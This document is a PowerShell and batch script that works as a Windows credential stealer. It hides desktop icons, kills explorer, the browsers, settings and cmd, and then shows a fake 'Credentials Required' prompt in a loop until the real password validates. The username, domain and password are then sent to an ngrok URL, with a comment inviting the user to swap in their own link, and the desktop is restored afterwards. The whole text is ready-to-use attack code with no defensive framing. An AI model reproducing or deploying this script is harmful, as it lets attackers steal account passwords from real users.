
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
taskkill /f /im opera.exe
taskkill /f /im firefox.exe
taskkill /f /im chrome.exe
taskkill /f /im microsoftedge.exe
taskkill /f /im systemsettings.exe
taskkill /f /im cmd.exe


$ngrokServer = "http://e7fd536c.ngrok.io/index.php"   #Replace link here

[int]$cnt = 1
while ( $cnt -lt '1000000000' ) {
 
	$user    = [Environment]::UserName
	$domain  = [Environment]::UserDomainName

	

        Add-Type -assemblyname System.Windows.Forms
	Add-Type -assemblyname System.DirectoryServices.AccountManagement 
	$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
	
        $c=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
        $credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your user name and password.", $c, "NetBiosUserName")
        $creds = $DS.ValidateCredentials($c, $credential.GetNetworkCredential().password)


	if ($creds -eq $false -Or $creds -eq $null) {
	    $choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed! Please enter correct password", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
	}		

        else {
            $user = $credential.GetNetworkCredential().username;
            $pass = $credential.GetNetworkCredential().password;
            $username = "username: ";
	    Invoke-WebRequest -Uri $ngrokServer -Method POST -Body $username$domain"\"$user" password: "$pass -ErrorAction Ignore
            REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 0 /f
            start explorer.exe
	    exit
        
	}

	$cnt++
}
